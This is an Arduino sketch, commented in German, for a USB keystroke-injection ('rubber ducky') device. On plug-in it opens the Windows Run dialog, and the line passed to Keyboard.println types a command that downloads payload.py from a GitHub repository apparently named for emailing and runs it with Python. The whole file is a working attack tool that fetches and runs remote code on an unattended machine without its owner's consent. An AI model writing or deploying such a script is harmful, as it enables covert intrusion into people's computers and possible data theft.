#include <Keyboard.h>

void setup() {
  delay(2000); // Nach Einstecken zwei Sekunde warten, damit das Zielsystem das Gerät erkannen kann

  Keyboard.begin(); // Starte Kommunikation

  // Ausführen-Fenster öffnen mit Super + R
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(500);

  // Alle Tasten loslassen
  Keyboard.releaseAll();
  delay(500);

  // Startet CMD versteckt, curl als Invoke-WebRequest, ruft die Datei "payload.py" von Github, speichert sie als temporäre Datei in %TEMP%, startet Python und führt payload.py aus
  Keyboard.println("cmd /c curl https://raw.githubusercontent.com/zkbyqd/rubber-ducky-emailer/main/payload.py -o %TEMP%\\payload.py && python %TEMP%\\payload.py");

  Keyboard.end(); // Beende Kommunikation
}

void loop() {

}
